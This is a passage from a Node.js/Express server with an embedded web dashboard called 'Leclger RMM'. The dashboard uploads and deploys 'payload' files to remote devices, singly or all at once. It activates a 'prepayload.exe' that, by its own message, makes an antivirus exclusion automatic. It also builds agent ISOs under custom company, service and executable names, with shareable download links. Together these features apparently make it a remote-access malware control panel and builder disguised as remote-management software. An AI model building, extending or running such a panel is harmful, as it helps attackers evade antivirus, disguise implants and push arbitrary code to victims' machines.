async function uploadForDevice(deviceId, hostname, input) {
  const file = input.files[0];
  if (!file) return;
  const form = new FormData();
  form.append('payload', file);
  toast(\`Uploading \${file.name} for \${hostname}...\`, 'info');
  try {
    const r = await fetch('/api/upload/' + deviceId, { method: 'POST', body: form });
    const d = await r.json();
    if (d.success) {
      toast(\`✅ \${file.name} assigned to \${hostname}\`);
      loadDevices();
    } else {
      toast(d.error || 'Upload failed', 'error');
    }
  } catch(e) { toast('Upload failed', 'error'); }
}

// ── Deploy device ─────────────────────────────────────────────
async function deployDevice(deviceId, hostname) {
  try {
    const r = await fetch('/api/deploy/' + deviceId, { method: 'POST' });
    const d = await r.json();
    toast(d.success ? d.message : d.error, d.success ? 'success' : 'error');
    if (d.success) loadDevices();
  } catch(e) { toast('Deploy failed', 'error'); }
}

// ── Deploy ALL ────────────────────────────────────────────────
async function deployAll() {
  if (!confirm('Deploy to all online devices that have payloads assigned?')) return;
  try {
    const r = await fetch('/api/deploy-all', { method: 'POST' });
    const d = await r.json();
    toast(d.message || d.error, d.success ? 'success' : 'error');
    if (d.success) loadDevices();
  } catch(e) { toast('Failed', 'error'); }
}

// ── Upload prepayload ─────────────────────────────────────────
async function uploadPrepayload(input) {
  const file = input.files[0];
  if (!file) return;
  if (file.name !== 'prepayload.exe') {
    toast('File must be named prepayload.exe exactly', 'error');
    input.value = ''; return;
  }
  const form = new FormData();
  form.append('prepayload', file);
  toast('Uploading prepayload.exe...', 'info');
  try {
    const r = await fetch('/api/upload-prepayload', { method:'POST', body: form });
    const d = await r.json();
    if (d.success) {
      toast('✅ prepayload.exe active — AV exclusion now automatic');
      document.getElementById('preUploadMsg').textContent = '✅ prepayload.exe active';
      document.getElementById('preUploadMsg').style.color = '#22c55e';
      checkStatus();
    } else toast(d.error, 'error');
  } catch(e) { toast('Upload failed', 'error'); }
}

// ── Builder ───────────────────────────────────────────────────
async function startBuild() {
  const cfg = {
    company_name: document.getElementById('bCompany').value.trim(),
    service_name: document.getElementById('bService').value.trim(),
    exe_name:     document.getElementById('bExe').value.trim(),
    iso_name:     document.getElementById('bIso').value.trim(),
    server_url:   document.getElementById('bServer').value.trim(),
  };

  if (!cfg.exe_name.endsWith('.exe')) { toast('EXE name must end with .exe', 'error'); return; }
  if (!cfg.iso_name.endsWith('.iso')) { toast('ISO name must end with .iso', 'error'); return; }
  if (cfg.service_name.includes(' ')){ toast('Service name cannot have spaces', 'error'); return; }

  const btn = document.getElementById('buildBtn');
  btn.disabled = true; btn.textContent = '⏳ Building...';

  const log = document.getElementById('buildLog');
  log.innerHTML = ''; log.classList.add('show');

  const addLog = (msg, cls='') => {
    const span = document.createElement('div');
    span.className = cls;
    span.textContent = msg;
    log.appendChild(span);
    log.scrollTop = log.scrollHeight;
  };

  addLog('Starting build...', 'log-info');

  try {
    const r = await fetch('/api/build', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(cfg)
    });
    const d = await r.json();
    if (!d.success) { toast(d.error, 'error'); btn.disabled=false; btn.textContent='⚡ Build Agent ISO'; return; }

    currentBuildId = d.buildId;
    addLog('Build ID: ' + d.buildId, 'log-info');

    // Poll for build status
    clearInterval(buildPollTimer);
    buildPollTimer = setInterval(async () => {
      try {
        const br = await fetch('/api/build/' + currentBuildId);
        const bd = await br.json();

        // Show new log lines
        const currentLines = log.children.length;
        if (bd.log && bd.log.length > currentLines) {
          bd.log.slice(currentLines).forEach(l => {
            const cls = l.includes('ERROR') ? 'log-error'
                      : l.includes('complete') || l.includes('Done') ? 'log-success'
                      : '';
            addLog(l, cls);
          });
        }

        if (bd.status === 'complete') {
          clearInterval(buildPollTimer);
          btn.disabled=false; btn.textContent='⚡ Build Agent ISO';
          addLog('✅ BUILD COMPLETE — ' + bd.isoFile, 'log-success');
          toast('✅ Agent built: ' + bd.isoFile);
          loadAgents();
        } else if (bd.status === 'error') {
          clearInterval(buildPollTimer);
          btn.disabled=false; btn.textContent='⚡ Build Agent ISO';
          addLog('❌ BUILD FAILED: ' + bd.error, 'log-error');
          toast('Build failed: ' + bd.error, 'error');
        }
      } catch(e) {}
    }, 2000);

  } catch(e) {
    toast('Build request failed', 'error');
    btn.disabled=false; btn.textContent='⚡ Build Agent ISO';
  }
}

// ── Agents list ───────────────────────────────────────────────
async function loadAgents() {
  try {
    const r = await fetch('/api/agents');
    agents = await r.json();
    const list = document.getElementById('agentList');
    if (!agents.length) { list.innerHTML = '<div class="empty">No agents built yet — use the builder above</div>'; return; }
    list.innerHTML = agents.map(a => \`
      <div class="agent-card">
        <div class="agent-card-name">📦 \${a.name}</div>
        <div class="agent-card-meta">\${a.size} &nbsp;·&nbsp; \${new Date(a.date).toLocaleDateString()}</div>
        <div class="agent-card-btns">
          <a class="btn btn-primary btn-sm" href="\${a.url}" download>⬇ Download</a>
          <button class="btn btn-ghost btn-sm" onclick="copyLink('\${location.origin}\${a.url}')">🔗 Copy Link</button>
        </div>
      </div>
    \`).join('');
  } catch(e) {}
}

function copyLink(url) {
  navigator.clipboard.writeText(url).then(() => toast('Link copied: ' + url));
}

// ── Auto-refresh ──────────────────────────────────────────────
checkStatus();
loadDevices();
setInterval(loadDevices, 15000);
setInterval(checkStatus, 30000);
</script>
</body>
</html>`);
});

app.listen(PORT, '0.0.0.0', () => {
  console.log('\n🛡️  Leclger RMM → http://localhost:' + PORT);
  console.log('   Prepayload: ' + (prepayloadReady() ? '✅ Ready' : '⚠️  Not uploaded'));
  console.log('');
});
